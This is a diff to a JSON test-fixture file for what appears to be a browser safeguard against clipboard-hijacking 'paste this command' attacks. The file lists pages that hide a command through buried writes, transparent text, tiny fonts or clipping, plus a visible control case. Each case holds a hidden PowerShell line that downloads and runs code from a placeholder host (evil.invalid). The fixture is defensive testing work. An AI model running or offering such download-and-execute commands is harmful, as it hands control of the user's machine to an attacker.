@@ -92,9 +92,97 @@
       "command": "iex (iwr https://evil.invalid/cv -UseBasicParsing)",
       "expectClipboard": "placeholder",
       "expectPageRead": "command"
+    },
+    {
+      "_group": "F1: a command buried in a large write",
+      "page": "f1_buried_300k.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/buried | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f1_buried_5m.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/buried | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "_group": "F2: the command is on screen but rendered unreadable",
+      "page": "f2_transparent.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_bg_color.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_tiny_font.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_clip_path.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_clip_rect.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_occluded.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_text_indent.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "f2_zero_lineheight.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "_group": "F3: a same-origin popup must read the page's own text, not the placeholder",
+      "page": "f3_popup.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/popup | iex\"",
+      "expectClipboard": "placeholder",
+      "expectPageRead": "command"
     }
   ],
   "legitimate": [
+    {
+      "_group": "F2 control: the same command, rendered readably, is allowed (not over-blocked)",
+      "page": "f2_control_visible.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/f2 | iex\"",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    },
     {
       "page": "legit_github_button.html",
       "trigger": "click",
